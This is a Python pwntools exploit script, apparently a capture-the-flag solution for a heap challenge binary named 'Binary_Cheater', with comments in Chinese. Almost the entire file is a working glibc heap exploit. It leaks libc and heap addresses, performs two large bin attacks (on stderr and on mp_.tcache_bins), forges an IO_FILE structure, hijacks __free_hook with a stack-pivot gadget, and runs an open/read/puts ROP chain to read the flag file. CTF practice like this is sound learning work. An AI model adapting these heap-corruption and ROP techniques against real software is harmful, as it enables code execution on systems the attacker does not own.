# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './Binary_Cheater'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 1
if DEBUG:
    libc = elf.libc
    # context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def getShell():
    sl('exec 1>&0')
    sl('echo shell')
    ru('shell')
    p.success('Get Shell')
    sl('cat flag')
    ru('flag')
    flag = rl()
    return ('flag' + flag)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

def add(size , content = 'a\n'):
    cmd(1)
    sla('Size' , size)
    sa('Content' , content)

def edit(idx , content = 'a'):
    cmd(2)
    sla('Index' , idx)
    sa('Content' , content)

def delete(idx):
    cmd(3)
    sla('Index' , idx)

def show(idx):
    cmd(4)
    sla('Index' , idx)
# one_gad = one_gadget(libc.path)

def attack():
    add(0x418) # 0 large bin 辅助快
    add(0x418) # 1 防止合并
    add(0x428) # 2 large bin 攻击块，地址泄露块
    add(0x428) # 3
    delete(2)
    add(0x450) # 4 把 unsorted bin 块挤进 large
    show(2)

    main_arena_addr = l64()
    __malloc_hook = main_arena_addr - 0x450 - 0x10
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    __free_hook = libc.sym['__free_hook']
    stderr = libc.sym['stderr']
    IO_str_jumps = libc.address + 0x1e5580
    setcontext = libc.sym['setcontext']
    mp_ = libc.address  + 0x1e32d0

    delete(0)

    fake_chunk_large = flat(
        main_arena_addr , main_arena_addr,
        0 , stderr - 0x20
    )

    # 此时 2在 large bin 中，0在 unsorted bin 中
    edit(2 , fake_chunk_large )
    add( 0x450 )  # 5 把 0 块挤进 large
    # dbg()

    # 触发 large bin attack 此时堆地址被写入 stderr 中

    show(2)

    heap_base = u64(p.recvuntil('\n', drop=True)[-6:].ljust(8, '\x00')) - 0x2b0
    lg('heap_base',heap_base)

    # --- 修复因为攻击而被破坏的 large bin ---
    edit(2 , flat( heap_base + 0x2b0 , main_arena_addr , heap_base + 0x2b0 , heap_base + 0x2b0 ) )
    edit(0 , flat( main_arena_addr , heap_base + 0xaf0 , heap_base + 0xaf0 , heap_base + 0xaf0 ) )
    # --- 修复因为攻击而被破坏的 large bin ---

    # 其实修复也很简单，我们只要还原到没有攻击的状态即可

    add( 0x418 ) # 6 0
    add( 0x428 ) # 7 2
    # bin 至此全部清空 

    add(0x450)
    add(0x450)
    add(0x450)
    delete(8)
    delete(9)
    delete(10)

    delete(7)
    add(0x450) # 11
    fake_chunk_large = flat(
        main_arena_addr , main_arena_addr,
        0 , mp_ - 0x20,
       # 这里指向 free_hook 的指针会被识别成对应大小 tcache 块的指针
    ) + p64(__free_hook)*0x50
    
    edit(7 , fake_chunk_large)

    delete(6)
    add(0x450) #12
    # 第二次 large bin 攻击 mp_.tcache_bins

    new_size = 0x1592 - 0x40
    old_blen = (new_size - 100) // 2

    fake_IO_FILE = flat(
        0,0,
        1,0xffffffffffff,0,
        heap_base + 0x2080 , heap_base + 0x2080 + old_blen,
        '\x00'*0x40 , heap_base,
        '\x00'*0x30 , 0,
        0,0,
        IO_str_jumps + 0x18 - 0x38
    )

    edit(6 , fake_IO_FILE)

    # 下面 2.31 开启 orw

    __free_hook = libc.sym['__free_hook']
    magic = 0x14e72a + libc.address
    
    # svcudp_reply+26
    # mov    rbp, qword ptr [rdi + 0x48]
    # mov    rax, qword ptr [rbp + 0x18]
    # lea    r13, [rbp + 0x10]
    # mov    dword ptr [rbp + 0x10], 0
    # mov    rdi, r13
    # call   qword ptr [rax + 0x28]
    
    read_addr = libc.sym['read']
    open_addr = libc.sym['open']
    puts_addr = libc.sym['puts']
    ret = libc.search(asm('ret')).next()
    leave_ret = libc.search(asm('leave;ret')).next()
    pop_rax_ret = libc.search(asm('pop rax; ret')).next()
    pop_rdi_ret = libc.search(asm('pop rdi; ret')).next()
    pop_rsi_ret = libc.search(asm('pop rsi; ret')).next()
    pop_r13_pop_r15_ret = libc.search(asm('pop r12 ; pop r13 ; ret')).next()
    pop_rdx_pop_rbx_ret = libc.search(asm('pop rdx ; pop rbx ; ret')).next()
    
    magic_chain  = flat(
        __free_hook + 0x8, pop_r13_pop_r15_ret , 
        __free_hook + 0x8, __free_hook + 0x10 ,
        pop_rdx_pop_rbx_ret, 0x300 ,
        leave_ret, pop_rsi_ret,
        __free_hook + 0x8 , pop_rdi_ret , 
        0 , read_addr 
    )
    # len magic_chain 0x60
    flag_addr = __free_hook + 0x100 + len(magic_chain) + 8
    chain = flat(
        pop_rdi_ret , flag_addr , pop_rsi_ret , 0 , open_addr,
        pop_rdi_ret , 3 , pop_rsi_ret , flag_addr , pop_rdx_pop_rbx_ret , 0x100 , 0 , read_addr,
        pop_rdi_ret , flag_addr , puts_addr
    ).ljust(0x100,'\x00') + 'flag\x00'
    # len chain 0x80
    
    payload = flat( magic ) + magic_chain
    # dbg('free')
    
    edit(9 , payload)
    add(0x430) #13
    edit(10, 'a' * 0x438 + p64(0x200))

    # dbg('*__vfprintf_internal+273')
    cmd(1)
    sla("ize:" , 0x440)

    payload =p64(ret)*0xc + chain
    se(payload)

    ''

attack()
# p.success(getShell())
p.interactive()

'''
@File    :   Binary_Cheater.py
@Time    :   2021/10/25 17:05:27
@Author  :   Niyah 
'''